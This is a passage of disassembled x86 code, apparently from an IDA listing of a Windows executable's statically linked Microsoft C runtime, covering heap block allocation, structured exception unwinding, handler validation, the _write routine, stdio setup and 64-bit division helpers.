		mov	ecx, [edx]
		sub	ecx, [ebp+var_10]
		mov	esi, ecx
		sar	esi, 4
		dec	esi
		cmp	esi, 3Fh
		mov	[ebp+var_8], ecx
		jle	short loc_100AA76
		push	3Fh
		pop	esi

loc_100AA76:				; CODE XREF: ___sbh_alloc_block+19Ej
		cmp	esi, edi
		jz	loc_100AB7F
		mov	ecx, [edx+4]
		cmp	ecx, [edx+8]
		jnz	short loc_100AAE2
		cmp	edi, 20h
		mov	ebx, 80000000h
		jge	short loc_100AAB6
		mov	ecx, edi
		shr	ebx, cl
		mov	ecx, [ebp+var_4]
		lea	edi, [eax+edi+4]
		not	ebx
		mov	[ebp+var_14], ebx
		and	ebx, [eax+ecx*4+44h]
		mov	[eax+ecx*4+44h], ebx
		dec	byte ptr [edi]
		jnz	short loc_100AADF
		mov	ecx, [ebp+var_14]
		mov	ebx, [ebp+arg_0]
		and	[ebx], ecx
		jmp	short loc_100AAE2
; ---------------------------------------------------------------------------

loc_100AAB6:				; CODE XREF: ___sbh_alloc_block+1BBj
		lea	ecx, [edi-20h]
		shr	ebx, cl
		mov	ecx, [ebp+var_4]
		lea	ecx, [eax+ecx*4+0C4h]
		lea	edi, [eax+edi+4]
		not	ebx
		and	[ecx], ebx
		dec	byte ptr [edi]
		mov	[ebp+var_14], ebx
		jnz	short loc_100AADF
		mov	ebx, [ebp+arg_0]
		mov	ecx, [ebp+var_14]
		and	[ebx+4], ecx
		jmp	short loc_100AAE2
; ---------------------------------------------------------------------------

loc_100AADF:				; CODE XREF: ___sbh_alloc_block+1D7j
					; ___sbh_alloc_block+1FFj
		mov	ebx, [ebp+arg_0]

loc_100AAE2:				; CODE XREF: ___sbh_alloc_block+1B1j
					; ___sbh_alloc_block+1E1j ...
		cmp	[ebp+var_8], 0
		mov	ecx, [edx+8]
		mov	edi, [edx+4]
		mov	[ecx+4], edi
		mov	ecx, [edx+4]
		mov	edi, [edx+8]
		mov	[ecx+8], edi
		jz	loc_100AB8B
		mov	ecx, [ebp+var_C]
		lea	ecx, [ecx+esi*8]
		mov	edi, [ecx+4]
		mov	[edx+8], ecx
		mov	[edx+4], edi
		mov	[ecx+4], edx
		mov	ecx, [edx+4]
		mov	[ecx+8], edx
		mov	ecx, [edx+4]
		cmp	ecx, [edx+8]
		jnz	short loc_100AB7C
		mov	cl, [esi+eax+4]
		mov	byte ptr [ebp+arg_0+3],	cl
		inc	cl
		cmp	esi, 20h
		mov	[esi+eax+4], cl
		jge	short loc_100AB53
		cmp	byte ptr [ebp+arg_0+3],	0
		jnz	short loc_100AB41
		mov	edi, 80000000h
		mov	ecx, esi
		shr	edi, cl
		or	[ebx], edi

loc_100AB41:				; CODE XREF: ___sbh_alloc_block+261j
		mov	ecx, esi
		mov	edi, 80000000h
		shr	edi, cl
		mov	ecx, [ebp+var_4]
		or	[eax+ecx*4+44h], edi
		jmp	short loc_100AB7C
; ---------------------------------------------------------------------------

loc_100AB53:				; CODE XREF: ___sbh_alloc_block+25Bj
		cmp	byte ptr [ebp+arg_0+3],	0
		jnz	short loc_100AB66
		lea	ecx, [esi-20h]
		mov	edi, 80000000h
		shr	edi, cl
		or	[ebx+4], edi

loc_100AB66:				; CODE XREF: ___sbh_alloc_block+284j
		mov	ecx, [ebp+var_4]
		lea	edi, [eax+ecx*4+0C4h]
		lea	ecx, [esi-20h]
		mov	esi, 80000000h
		shr	esi, cl
		or	[edi], esi

loc_100AB7C:				; CODE XREF: ___sbh_alloc_block+249j
					; ___sbh_alloc_block+27Ej
		mov	ecx, [ebp+var_8]

loc_100AB7F:				; CODE XREF: ___sbh_alloc_block+1A5j
		test	ecx, ecx
		jz	short loc_100AB8E
		mov	[edx], ecx
		mov	[ecx+edx-4], ecx
		jmp	short loc_100AB8E
; ---------------------------------------------------------------------------

loc_100AB8B:				; CODE XREF: ___sbh_alloc_block+225j
		mov	ecx, [ebp+var_8]

loc_100AB8E:				; CODE XREF: ___sbh_alloc_block+2AEj
					; ___sbh_alloc_block+2B6j
		mov	esi, [ebp+var_10]
		add	edx, ecx
		lea	ecx, [esi+1]
		mov	[edx], ecx
		mov	[edx+esi-4], ecx
		mov	esi, [ebp+var_C]
		mov	ecx, [esi]
		test	ecx, ecx
		lea	edi, [ecx+1]
		mov	[esi], edi
		jnz	short loc_100ABC4
		cmp	ebx, ___sbh_pHeaderDefer
		jnz	short loc_100ABC4
		mov	ecx, [ebp+var_4]
		cmp	ecx, ___sbh_indGroupDefer
		jnz	short loc_100ABC4
		and	___sbh_pHeaderDefer, 0

loc_100ABC4:				; CODE XREF: ___sbh_alloc_block+2D5j
					; ___sbh_alloc_block+2DDj ...
		mov	ecx, [ebp+var_4]
		mov	[eax], ecx
		lea	eax, [edx+4]

loc_100ABCC:				; CODE XREF: ___sbh_alloc_block+17Aj
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
___sbh_alloc_block endp

; ---------------------------------------------------------------------------
		align 8

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

__global_unwind2 proc near		; CODE XREF: __except_handler3+70p

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ebx
		push	esi
		push	edi
		push	ebp
		push	0
		push	0
		push	offset loc_100ABF0
		push	[ebp+arg_0]
		call	_RtlUnwind@16	; RtlUnwind(x,x,x,x)

loc_100ABF0:				; DATA XREF: __global_unwind2+Bo
		pop	ebp
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
__global_unwind2 endp


; =============== S U B	R O U T	I N E =======================================


sub_100ABF8	proc near		; DATA XREF: .text:010038C4o
					; __local_unwind2+Bo ...

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_C		= dword	ptr  10h
arg_10		= dword	ptr  14h

		mov	ecx, [esp+arg_0]
		test	dword ptr [ecx+4], 6
		mov	eax, 1
		jz	short locret_100AC32
		mov	eax, [esp+arg_10]
		push	ebp
		mov	ebp, [eax+10h]
		mov	edx, [eax+28h]
		push	edx
		mov	edx, [eax+24h]
		push	edx
		call	__local_unwind2
		add	esp, 8
		pop	ebp
		mov	eax, [esp+arg_4]
		mov	edx, [esp+arg_C]
		mov	[edx], eax
		mov	eax, 3

locret_100AC32:				; CODE XREF: sub_100ABF8+10j
		retn
sub_100ABF8	endp


; =============== S U B	R O U T	I N E =======================================


__local_unwind2	proc near		; CODE XREF: __except_handler3+7Dp
					; __except_handler3+D0p ...

var_18		= dword	ptr -18h
arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

; FUNCTION CHUNK AT 0100AC95 SIZE 0000000E BYTES

		push	ebx
		push	esi
		push	edi
		mov	eax, [esp+0Ch+arg_0]
		push	ebp
		push	eax
		push	0FFFFFFFEh
		push	offset sub_100ABF8
		push	large dword ptr	fs:0
		mov	large fs:0, esp

loc_100AC51:				; CODE XREF: __NLG_Return2j
		mov	eax, [esp+20h+arg_0]
		mov	ebx, [eax+8]
		mov	esi, [eax+0Ch]
		cmp	esi, 0FFFFFFFFh
		jz	short loc_100AC95
		cmp	[esp+20h+arg_4], 0FFFFFFFFh
		jz	short loc_100AC6D
		cmp	esi, [esp+20h+arg_4]
		jbe	short loc_100AC95

loc_100AC6D:				; CODE XREF: __local_unwind2+32j
		lea	esi, [esi+esi*2]
		mov	ecx, [ebx+esi*4]
		mov	[esp+20h+var_18], ecx
		mov	[eax+0Ch], ecx
		cmp	dword ptr [ebx+esi*4+4], 0
		jnz	short __NLG_Return2
		push	101h
		mov	eax, [ebx+esi*4+8]
		call	__NLG_Notify
		call	dword ptr [ebx+esi*4+8]
__local_unwind2	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


__NLG_Return2	proc near		; CODE XREF: __local_unwind2+4Cj
		jmp	short loc_100AC51
__NLG_Return2	endp

; ---------------------------------------------------------------------------
; START	OF FUNCTION CHUNK FOR __local_unwind2

loc_100AC95:				; CODE XREF: __local_unwind2+2Bj
					; __local_unwind2+38j
		pop	large dword ptr	fs:0
		add	esp, 10h
		pop	edi
		pop	esi
		pop	ebx
		retn
; END OF FUNCTION CHUNK	FOR __local_unwind2

; =============== S U B	R O U T	I N E =======================================


; int __cdecl _abnormal_termination()
__abnormal_termination proc near
		xor	eax, eax
		mov	ecx, large fs:0
		cmp	dword ptr [ecx+4], offset sub_100ABF8
		jnz	short locret_100ACC5
		mov	edx, [ecx+0Ch]
		mov	edx, [edx+0Ch]
		cmp	[ecx+8], edx
		jnz	short locret_100ACC5
		mov	eax, 1

locret_100ACC5:				; CODE XREF: __abnormal_termination+10j
					; __abnormal_termination+1Bj
		retn
__abnormal_termination endp


; =============== S U B	R O U T	I N E =======================================


__NLG_Notify1	proc near
		push	ebx
		push	ecx
		mov	ebx, offset __NLG_Destination
		jmp	short loc_100ACD9
__NLG_Notify1	endp


; =============== S U B	R O U T	I N E =======================================


__NLG_Notify	proc near		; CODE XREF: __except_handler3+8Ep
					; __local_unwind2+57p
		push	ebx
		push	ecx
		mov	ebx, offset __NLG_Destination
		mov	ecx, [ebp+8]

loc_100ACD9:				; CODE XREF: __NLG_Notify1+7j
		mov	[ebx+8], ecx
		mov	[ebx+4], eax
		mov	[ebx+0Ch], ebp
		push	ebp
		push	ecx
		push	eax
__NLG_Notify	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


__NLG_Dispatch2	proc near
		pop	eax
		pop	ecx
		pop	ebp
		pop	ecx
		pop	ebx
		retn	4
__NLG_Dispatch2	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

__ValidateEH3RN	proc near		; CODE XREF: __except_handler3+34p

Buffer		= _MEMORY_BASIC_INFORMATION ptr	-20h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 20h
		push	ebx
		push	esi
		mov	esi, [ebp+arg_0]
		mov	ebx, [esi+8]
		test	bl, 3
		jnz	short loc_100AD23
		mov	eax, large fs:4
		mov	[ebp+arg_0], eax
		mov	eax, large fs:8
		mov	[ebp+var_4], eax
		cmp	ebx, [ebp+var_4]
		jb	short loc_100AD2A
		cmp	ebx, [ebp+arg_0]
		jnb	short loc_100AD2A

loc_100AD23:				; CODE XREF: __ValidateEH3RN+13j
		xor	eax, eax
		jmp	loc_100AF1A
; ---------------------------------------------------------------------------

loc_100AD2A:				; CODE XREF: __ValidateEH3RN+2Aj
					; __ValidateEH3RN+2Fj
		push	edi
		mov	edi, [esi+0Ch]
		cmp	edi, 0FFFFFFFFh
		jnz	short loc_100AD3B

loc_100AD33:				; CODE XREF: __ValidateEH3RN+13Cj
					; __ValidateEH3RN+19Fj	...
		xor	eax, eax
		inc	eax
		jmp	loc_100AF19
; ---------------------------------------------------------------------------

loc_100AD3B:				; CODE XREF: __ValidateEH3RN+3Fj
		xor	edx, edx
		mov	[ebp+arg_0], edx
		mov	eax, ebx

loc_100AD42:				; CODE XREF: __ValidateEH3RN+6Ej
		mov	ecx, [eax]
		cmp	ecx, 0FFFFFFFFh
		jz	short loc_100AD51
		cmp	ecx, edx
		jnb	loc_100AE96

loc_100AD51:				; CODE XREF: __ValidateEH3RN+55j
		cmp	dword ptr [eax+4], 0
		jz	short loc_100AD5A
		inc	[ebp+arg_0]

loc_100AD5A:				; CODE XREF: __ValidateEH3RN+63j
		inc	edx
		add	eax, 0Ch
		cmp	edx, edi
		jbe	short loc_100AD42
		cmp	[ebp+arg_0], 0
		jz	short loc_100AD7C
		mov	eax, [esi-8]
		cmp	eax, [ebp+var_4]
		jb	loc_100AE96
		cmp	eax, esi
		jnb	loc_100AE96

loc_100AD7C:				; CODE XREF: __ValidateEH3RN+74j
		mov	eax, dword_1010788
		mov	edi, ebx
		and	edi, 0FFFFF000h
		xor	esi, esi
		test	eax, eax
		jle	short loc_100ADA1

loc_100AD8F:				; CODE XREF: __ValidateEH3RN+ADj
		cmp	dword_1010790[esi*4], edi
		jz	loc_100AE9A
		inc	esi
		cmp	esi, eax
		jl	short loc_100AD8F

loc_100ADA1:				; CODE XREF: __ValidateEH3RN+9Bj
		push	1Ch		; dwLength
		lea	eax, [ebp+Buffer]
		push	eax		; lpBuffer
		push	ebx		; lpAddress
		call	ds:__imp__VirtualQuery@12 ; VirtualQuery(x,x,x)
		test	eax, eax
		jz	loc_100AF16
		cmp	[ebp+Buffer.Type], 1000000h
		jnz	loc_100AF16
		test	byte ptr [ebp+Buffer.Protect], 0CCh
		jz	short loc_100AE1F
		mov	ecx, [ebp+Buffer.AllocationBase]
		cmp	word ptr [ecx],	5A4Dh
		jnz	loc_100AF16
		mov	eax, [ecx+3Ch]
		add	eax, ecx
		cmp	dword ptr [eax], 4550h
		jnz	loc_100AF16
		cmp	word ptr [eax+18h], 10Bh
		jnz	loc_100AF16
		sub	ebx, ecx
		cmp	word ptr [eax+6], 0
		movzx	ecx, word ptr [eax+14h]
		lea	ecx, [ecx+eax+18h]
		jbe	loc_100AF16
		mov	eax, [ecx+0Ch]
		cmp	ebx, eax
		jb	short loc_100AE1F
		mov	edx, [ecx+8]
		add	edx, eax
		cmp	ebx, edx
		jnb	short loc_100AE1F
		test	byte ptr [ecx+27h], 80h
		jnz	short loc_100AE96

loc_100AE1F:				; CODE XREF: __ValidateEH3RN+D5j
					; __ValidateEH3RN+11Cj	...
		push	1		; Value
		push	offset Target	; Target
		call	ds:__imp__InterlockedExchange@8	; InterlockedExchange(x,x)
		test	eax, eax
		jnz	loc_100AD33
		mov	ecx, dword_1010788
		test	ecx, ecx
		mov	edx, ecx
		jle	short loc_100AE53
		lea	eax, ds:101078Ch[ecx*4]

loc_100AE47:				; CODE XREF: __ValidateEH3RN+15Fj
		cmp	[eax], edi
		jz	short loc_100AE53
		dec	edx
		sub	eax, 4
		test	edx, edx
		jg	short loc_100AE47

loc_100AE53:				; CODE XREF: __ValidateEH3RN+14Cj
					; __ValidateEH3RN+157j
		test	edx, edx
		jnz	short loc_100AE84
		push	0Fh
		pop	ebx
		cmp	ecx, ebx
		jg	short loc_100AE60
		mov	ebx, ecx

loc_100AE60:				; CODE XREF: __ValidateEH3RN+16Aj
		xor	edx, edx
		test	ebx, ebx
		jl	short loc_100AE78

loc_100AE66:				; CODE XREF: __ValidateEH3RN+184j
		lea	eax, ds:1010790h[edx*4]
		mov	esi, [eax]
		inc	edx
		cmp	edx, ebx
		mov	[eax], edi
		mov	edi, esi
		jle	short loc_100AE66

loc_100AE78:				; CODE XREF: __ValidateEH3RN+172j
		cmp	ecx, 10h
		jge	short loc_100AE84
		inc	ecx
		mov	dword_1010788, ecx

loc_100AE84:				; CODE XREF: __ValidateEH3RN+163j
					; __ValidateEH3RN+189j
		push	0		; Value
		push	offset Target	; Target
		call	ds:__imp__InterlockedExchange@8	; InterlockedExchange(x,x)
		jmp	loc_100AD33
; ---------------------------------------------------------------------------

loc_100AE96:				; CODE XREF: __ValidateEH3RN+59j
					; __ValidateEH3RN+7Cj ...
		xor	eax, eax
		jmp	short loc_100AF19
; ---------------------------------------------------------------------------

loc_100AE9A:				; CODE XREF: __ValidateEH3RN+A4j
		test	esi, esi
		jle	loc_100AD33
		mov	ebx, ds:__imp__InterlockedExchange@8 ; InterlockedExchange(x,x)
		push	1		; Value
		push	offset Target	; Target
		call	ebx ; InterlockedExchange(x,x) ; InterlockedExchange(x,x)
		test	eax, eax
		jnz	loc_100AD33
		cmp	dword_1010790[esi*4], edi
		jz	short loc_100AEF0
		mov	eax, dword_1010788
		lea	esi, [eax-1]
		test	esi, esi
		jl	short loc_100AEDE

loc_100AECE:				; CODE XREF: __ValidateEH3RN+1E6j
		cmp	dword_1010790[esi*4], edi
		jz	short loc_100AEDA
		dec	esi
		jns	short loc_100AECE

loc_100AEDA:				; CODE XREF: __ValidateEH3RN+1E3j
		test	esi, esi
		jge	short loc_100AEEE

loc_100AEDE:				; CODE XREF: __ValidateEH3RN+1DAj
		cmp	eax, 10h
		jge	short loc_100AEE9
		inc	eax
		mov	dword_1010788, eax

loc_100AEE9:				; CODE XREF: __ValidateEH3RN+1EFj
		lea	esi, [eax-1]
		jmp	short loc_100AEF0
; ---------------------------------------------------------------------------

loc_100AEEE:				; CODE XREF: __ValidateEH3RN+1EAj
		jz	short loc_100AF08

loc_100AEF0:				; CODE XREF: __ValidateEH3RN+1CEj
					; __ValidateEH3RN+1FAj
		xor	ecx, ecx
		test	esi, esi
		jl	short loc_100AF08

loc_100AEF6:				; CODE XREF: __ValidateEH3RN+214j
		lea	eax, ds:1010790h[ecx*4]
		mov	edx, [eax]
		inc	ecx
		cmp	ecx, esi
		mov	[eax], edi
		mov	edi, edx
		jle	short loc_100AEF6

loc_100AF08:				; CODE XREF: __ValidateEH3RN:loc_100AEEEj
					; __ValidateEH3RN+202j
		push	0		; Value
		push	offset Target	; Target
		call	ebx ; InterlockedExchange(x,x) ; InterlockedExchange(x,x)
		jmp	loc_100AD33
; ---------------------------------------------------------------------------

loc_100AF16:				; CODE XREF: __ValidateEH3RN+BEj
					; __ValidateEH3RN+CBj ...
		or	eax, 0FFFFFFFFh

loc_100AF19:				; CODE XREF: __ValidateEH3RN+44j
					; __ValidateEH3RN+1A6j
		pop	edi

loc_100AF1A:				; CODE XREF: __ValidateEH3RN+33j
		pop	esi
		pop	ebx
		leave
		retn
__ValidateEH3RN	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl _write(int, const	void *,	unsigned int)
__write		proc near		; CODE XREF: __flush+30p

var_424		= dword	ptr -424h
var_420		= dword	ptr -420h
var_41C		= dword	ptr -41Ch
NumberOfBytesWritten= dword ptr	-418h
var_414		= dword	ptr -414h
var_410		= dword	ptr -410h
var_40C		= dword	ptr -40Ch
Buffer		= byte ptr -408h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
lpBuffer	= dword	ptr  0Ch
nNumberOfBytesToWrite= dword ptr  10h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 424h
		mov	ecx, [ebp+arg_0]
		cmp	ecx, __nhandle
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
		mov	edi, [ebp+lpBuffer]
		mov	[ebp+var_4], eax
		mov	[ebp+var_41C], edi
		jnb	loc_100B109
		mov	eax, ecx
		sar	eax, 5
		lea	ebx, ds:1011B40h[eax*4]
		mov	eax, [ebx]
		mov	esi, ecx
		and	esi, 1Fh
		shl	esi, 3
		mov	al, [eax+esi+4]
		test	al, 1
		mov	[ebp+var_424], ebx
		jz	loc_100B109
		and	[ebp+var_414], 0
		and	[ebp+var_420], 0
		cmp	[ebp+nNumberOfBytesToWrite], 0
		jnz	short loc_100AF94

loc_100AF8D:				; CODE XREF: __write+1CCj
		xor	eax, eax
		jmp	loc_100B11D
; ---------------------------------------------------------------------------

loc_100AF94:				; CODE XREF: __write+68j
		test	al, 20h
		jz	short loc_100AFA7
		push	2		; int
		push	0
		push	0		; __int64
		push	ecx		; int
		call	__lseeki64
		add	esp, 10h

loc_100AFA7:				; CODE XREF: __write+73j
		mov	eax, [ebx]
		add	eax, esi
		test	byte ptr [eax+4], 80h
		jz	loc_100B067
		and	[ebp+var_40C], 0
		cmp	[ebp+nNumberOfBytesToWrite], 0
		mov	[ebp+var_410], edi
		jbe	loc_100B0E3

loc_100AFCC:				; CODE XREF: __write+13Cj
		mov	ecx, [ebp+var_410]
		xor	edi, edi
		sub	ecx, [ebp+var_41C]
		lea	eax, [ebp+Buffer]

loc_100AFE0:				; CODE XREF: __write+F1j
		cmp	ecx, [ebp+nNumberOfBytesToWrite]
		jnb	short loc_100B016
		mov	edx, [ebp+var_410]
		inc	[ebp+var_410]
		mov	dl, [edx]
		inc	ecx
		cmp	dl, 0Ah
		jnz	short loc_100B004
		inc	[ebp+var_420]
		mov	byte ptr [eax],	0Dh
		inc	eax
		inc	edi

loc_100B004:				; CODE XREF: __write+D4j
		mov	ebx, [ebp+var_424]
		mov	[eax], dl
		inc	eax
		inc	edi
		cmp	edi, 400h
		jl	short loc_100AFE0

loc_100B016:				; CODE XREF: __write+C0j
		mov	edi, eax
		lea	eax, [ebp+Buffer]
		sub	edi, eax
		push	0		; lpOverlapped
		lea	eax, [ebp+NumberOfBytesWritten]
		push	eax		; lpNumberOfBytesWritten
		push	edi		; nNumberOfBytesToWrite
		lea	eax, [ebp+Buffer]
		push	eax		; lpBuffer
		mov	eax, [ebx]
		push	dword ptr [eax+esi] ; hFile
		call	ds:__imp__WriteFile@20 ; WriteFile(x,x,x,x,x)
		test	eax, eax
		jz	short loc_100B095
		mov	eax, [ebp+NumberOfBytesWritten]
		add	[ebp+var_414], eax
		cmp	eax, edi
		jl	short loc_100B0A1
		mov	eax, [ebp+var_410]
		sub	eax, [ebp+var_41C]
		cmp	eax, [ebp+nNumberOfBytesToWrite]
		jb	loc_100AFCC
		jmp	short loc_100B0A1
; ---------------------------------------------------------------------------

loc_100B067:				; CODE XREF: __write+8Cj
		push	0		; lpOverlapped
		lea	ecx, [ebp+NumberOfBytesWritten]
		push	ecx		; lpNumberOfBytesWritten
		push	[ebp+nNumberOfBytesToWrite] ; nNumberOfBytesToWrite
		push	edi		; lpBuffer
		push	dword ptr [eax]	; hFile
		call	ds:__imp__WriteFile@20 ; WriteFile(x,x,x,x,x)
		test	eax, eax
		jz	short loc_100B095
		mov	eax, [ebp+NumberOfBytesWritten]
		and	[ebp+var_40C], 0
		mov	[ebp+var_414], eax
		jmp	short loc_100B0A1
; ---------------------------------------------------------------------------

loc_100B095:				; CODE XREF: __write+11Bj __write+15Bj
		call	ds:__imp__GetLastError@0 ; GetLastError()
		mov	[ebp+var_40C], eax

loc_100B0A1:				; CODE XREF: __write+12Bj __write+142j ...
		mov	eax, [ebp+var_414]
		test	eax, eax
		jnz	short loc_100B101
		cmp	[ebp+var_40C], eax
		jz	short loc_100B0DD
		push	5
		pop	eax
		cmp	[ebp+var_40C], eax
		jnz	short loc_100B0CF
		mov	_errno,	9
		mov	__doserrno, eax
		jmp	short loc_100B11A
; ---------------------------------------------------------------------------

loc_100B0CF:				; CODE XREF: __write+199j
		push	[ebp+var_40C]
		call	__dosmaperr
		pop	ecx
		jmp	short loc_100B11A
; ---------------------------------------------------------------------------

loc_100B0DD:				; CODE XREF: __write+18Ej
		mov	edi, [ebp+var_41C]

loc_100B0E3:				; CODE XREF: __write+A3j
		mov	eax, [ebx]
		test	byte ptr [eax+esi+4], 40h
		jz	short loc_100B0F5
		cmp	byte ptr [edi],	1Ah
		jz	loc_100AF8D

loc_100B0F5:				; CODE XREF: __write+1C7j
		mov	_errno,	1Ch
		jmp	short loc_100B113
; ---------------------------------------------------------------------------

loc_100B101:				; CODE XREF: __write+186j
		sub	eax, [ebp+var_420]
		jmp	short loc_100B11D
; ---------------------------------------------------------------------------

loc_100B109:				; CODE XREF: __write+28j __write+50j
		mov	_errno,	9

loc_100B113:				; CODE XREF: __write+1DCj
		and	__doserrno, 0

loc_100B11A:				; CODE XREF: __write+1AAj __write+1B8j
		or	eax, 0FFFFFFFFh

loc_100B11D:				; CODE XREF: __write+6Cj __write+1E4j
		mov	ecx, [ebp+var_4]
		pop	edi
		pop	esi
		pop	ebx
		call	@__security_check_cookie@4 ; __security_check_cookie(x)
		leave
		retn
__write		endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================


___initstdio	proc near		; DATA XREF: .data:0100E014o
		mov	eax, __nstream
		test	eax, eax
		push	esi
		push	14h
		pop	esi
		jnz	short loc_100B143
		mov	eax, 200h
		jmp	short loc_100B149
; ---------------------------------------------------------------------------

loc_100B143:				; CODE XREF: ___initstdio+Bj
		cmp	eax, esi
		jge	short loc_100B14E
		mov	eax, esi

loc_100B149:				; CODE XREF: ___initstdio+12j
		mov	__nstream, eax

loc_100B14E:				; CODE XREF: ___initstdio+16j
		push	4		; SizeOfElements
		push	eax		; NumOfElements
		call	_calloc
		test	eax, eax
		pop	ecx
		pop	ecx
		mov	___piob, eax
		jnz	short loc_100B17F
		push	4		; SizeOfElements
		push	esi		; NumOfElements
		mov	__nstream, esi
		call	_calloc
		test	eax, eax
		pop	ecx
		pop	ecx
		mov	___piob, eax
		jnz	short loc_100B17F
		push	1Ah
		pop	eax
		pop	esi
		retn
; ---------------------------------------------------------------------------

loc_100B17F:				; CODE XREF: ___initstdio+30j
					; ___initstdio+49j
		xor	edx, edx
		mov	ecx, offset __iob
		jmp	short loc_100B18D
; ---------------------------------------------------------------------------

loc_100B188:				; CODE XREF: ___initstdio+6Dj
		mov	eax, ___piob

loc_100B18D:				; CODE XREF: ___initstdio+57j
		mov	[edx+eax], ecx
		add	ecx, 20h
		add	edx, 4
		cmp	ecx, offset ___nullstring
		jl	short loc_100B188
		xor	edx, edx
		mov	ecx, offset dword_100E488

loc_100B1A5:				; CODE XREF: ___initstdio+A0j
		mov	eax, edx
		sar	eax, 5
		mov	eax, ___pioinfo[eax*4]
		mov	esi, edx
		and	esi, 1Fh
		mov	eax, [eax+esi*8]
		cmp	eax, 0FFFFFFFFh
		jz	short loc_100B1C2
		test	eax, eax
		jnz	short loc_100B1C5

loc_100B1C2:				; CODE XREF: ___initstdio+8Dj
		or	dword ptr [ecx], 0FFFFFFFFh

loc_100B1C5:				; CODE XREF: ___initstdio+91j
		add	ecx, 20h
		inc	edx
		cmp	ecx, offset dword_100E4E8
		jl	short loc_100B1A5
		xor	eax, eax
		pop	esi
		retn
___initstdio	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================


___endstdio	proc near		; DATA XREF: .data:0100E020o
		call	__flushall
		cmp	__exitflag, 0
		jz	short locret_100B1ED
		jmp	__fcloseall
; ---------------------------------------------------------------------------

locret_100B1ED:				; CODE XREF: ___endstdio+Cj
		retn
___endstdio	endp

; ---------------------------------------------------------------------------
		db 12h dup(0CCh)

; =============== S U B	R O U T	I N E =======================================


__aulldvrm	proc near

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch
arg_C		= dword	ptr  10h

		push	esi
		mov	eax, [esp+4+arg_C]
		or	eax, eax
		jnz	short loc_100B231
		mov	ecx, [esp+4+arg_8]
		mov	eax, [esp+4+arg_4]
		xor	edx, edx
		div	ecx
		mov	ebx, eax
		mov	eax, [esp+4+arg_0]
		div	ecx
		mov	esi, eax
		mov	eax, ebx
		mul	[esp+4+arg_8]
		mov	ecx, eax
		mov	eax, esi
		mul	[esp+4+arg_8]
		add	edx, ecx
		jmp	short loc_100B278
; ---------------------------------------------------------------------------

loc_100B231:				; CODE XREF: __aulldvrm+7j
		mov	ecx, eax
		mov	ebx, [esp+4+arg_8]
		mov	edx, [esp+4+arg_4]
		mov	eax, [esp+4+arg_0]

loc_100B23F:				; CODE XREF: __aulldvrm+49j
		shr	ecx, 1
		rcr	ebx, 1
		shr	edx, 1
		rcr	eax, 1
		or	ecx, ecx
		jnz	short loc_100B23F
		div	ebx
		mov	esi, eax
		mul	[esp+4+arg_C]
		mov	ecx, eax
		mov	eax, [esp+4+arg_8]
		mul	esi
		add	edx, ecx
		jb	short loc_100B26D
		cmp	edx, [esp+4+arg_4]
		ja	short loc_100B26D
		jb	short loc_100B276
		cmp	eax, [esp+4+arg_0]
		jbe	short loc_100B276

loc_100B26D:				; CODE XREF: __aulldvrm+5Dj
					; __aulldvrm+63j
		dec	esi
		sub	eax, [esp+4+arg_8]
		sbb	edx, [esp+4+arg_C]

loc_100B276:				; CODE XREF: __aulldvrm+65j
					; __aulldvrm+6Bj
		xor	ebx, ebx

loc_100B278:				; CODE XREF: __aulldvrm+2Fj
		sub	eax, [esp+4+arg_0]
		sbb	edx, [esp+4+arg_4]
		neg	edx
		neg	eax
		sbb	edx, 0
		mov	ecx, edx
		mov	edx, ebx
		mov	ebx, ecx
		mov	ecx, eax
		mov	eax, esi
		pop	esi
		retn	10h
__aulldvrm	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

__callnewh	proc near		; CODE XREF: __nh_malloc+20p
					; _calloc+75p

arg_0		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		mov	eax, ?_pnhHeap@@3P6AHI@ZA ; int	(*_pnhHeap)(uint)
		test	eax, eax
		jz	short loc_100B2B7
		push	[ebp+arg_0]
		call	eax ; int (*_pnhHeap)(uint)
		test	eax, eax
		pop	ecx
		jz	short loc_100B2B7
		xor	eax, eax
		inc	eax
		pop	ebp
		retn
; ---------------------------------------------------------------------------

loc_100B2B7:				; CODE XREF: __callnewh+Cj
					; __callnewh+16j
		xor	eax, eax
		pop	ebp
		retn
__callnewh	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl __ansicp(LCID Locale)
___ansicp	proc near		; CODE XREF: ___crtLCMapStringA+280p
					; ___crtGetStringTypeA+166p

Str		= byte ptr -0Ch
var_6		= byte ptr -6
var_4		= dword	ptr -4
Locale		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		mov	eax, ___security_cookie
		push	6		; cchData
		mov	[ebp+var_4], eax
		lea	eax, [ebp+Str]
		push	eax		; lpLCData
		push	1004h		; LCType
		push	[ebp+Locale]	; Locale
		mov	[ebp+var_6], 0
		call	ds:__imp__GetLocaleInfoA@16 ; GetLocaleInfoA(x,x,x,x)
		test	eax, eax
		jnz	short loc_100B2F1
		or	eax, 0FFFFFFFFh
		jmp	short loc_100B2FB
; ---------------------------------------------------------------------------

